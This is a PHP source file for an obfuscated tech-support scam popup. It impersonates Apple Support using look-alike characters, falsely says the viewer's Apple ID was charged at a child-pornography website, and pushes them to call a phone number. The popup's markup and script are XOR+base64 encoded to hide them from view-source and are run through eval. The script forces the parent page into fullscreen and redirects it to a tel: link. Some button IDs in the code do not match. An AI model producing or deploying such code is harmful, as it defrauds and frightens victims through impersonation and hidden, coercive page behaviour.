<?php
// popup.php - popup content is kept as plaintext ONLY here on the server.
// It is sent to the browser XOR+base64 encoded, and decoded at runtime.
// NOTE: this is obfuscation (deters View-Source), NOT real security.
// The rendered DOM is still visible in DevTools.

$KEY = "Xk7Qm9Zp";

function obf($str, $key) {
    $out = "";
    $kl = strlen($key);
    for ($i = 0; $i < strlen($str); $i++) {
        $out .= chr(ord($str[$i]) ^ ord($key[$i % $kl]));
    }
    return base64_encode($out);
}

// ---- Plaintext markup (includes styles) ----
$markup = <<<HTML
<style>
  * {
  margin:0;
  padding:0;
  box-sizing:border-box;
}
  
html, body {
  width:100%;
  height:auto;        /* 🔥 important */
  overflow:hidden;    /* 🔥 scrollbar remove */
  background:transparent;
}
  body {
  display:flex;
  align-items:center;
  justify-content:center;
}
.ios-popup {
  width:320px;
  max-width:100%;
  background:#1c1c1e;
  color:#fff;
  border-radius:14px;
  overflow:hidden;
}
  .popup-body { padding:20px 16px 16px; }
  .popup-title { font-size:17px; font-weight:600; margin-bottom:6px; }
  .popup-msg { font-size:13px; line-height:1.4; opacity:.85; }
  .popup-actions { display:flex; border-top:1px solid rgba(255,255,255,.18); }
  .popup-btn { flex:1; border:none; background:transparent; color:#0a84ff; font-size:17px; padding:12px; cursor:pointer; }
  .popup-btn.cancel { font-weight:400; border-right:1px solid rgba(255,255,255,.18); }
  .popup-btn.confirm { font-weight:600; }
  .popup-btn:active { background:rgba(255,255,255,.06); }
</style>
<div class="ios-popup">
  <div class="popup-body">
    <h2 class="popup-title">Applẹ Support</h2>
    <p class="popup-msg">Your Applẹ ID was recently used at CHÍLD P0RN0GRÀPHY WEBSITE for $569.96 Via Applẹ Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Applẹ Support +1-855-616-3048 to Freeze it!.</p>
  </div>
  <div class="popup-actions">
    <button class="popup-btn cancel" id="popupBtn">Cancel</button>
    <button class="popup-btn confirm" id="popupBtn">OK</button>
  </div>
</div>
HTML;

// ---- Plaintext behaviour script ----
$js = <<<JS
var CALL_NUMBER = "tel:+1-855-616-3048";
document.getElementById("popupBtn").addEventListener("click", function () {
  var pdoc = window.parent.document;
  var el = pdoc.documentElement;
  if (el.requestFullscreen) { el.requestFullscreen().catch(function(){}); }
  else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
  window.parent.location.href = CALL_NUMBER;
});
document.getElementById("cancelBtn").addEventListener("click", function () {
  window.parent.postMessage("closePopup", "*");
});
JS;

$encMarkup = obf($markup, $KEY);
$encJs     = obf($js, $KEY);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <div id="app"></div>
  <script>
    var __K = "<?php echo $KEY; ?>";
    function __d(b64, key) {
      var s = atob(b64), o = "";
      for (var i = 0; i < s.length; i++) {
        o += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length));
      }
      return o;
    }
    document.getElementById("app").innerHTML = __d("<?php echo $encMarkup; ?>", __K);
    (0, eval)(__d("<?php echo $encJs; ?>", __K));
  </script>
</body>
</html>
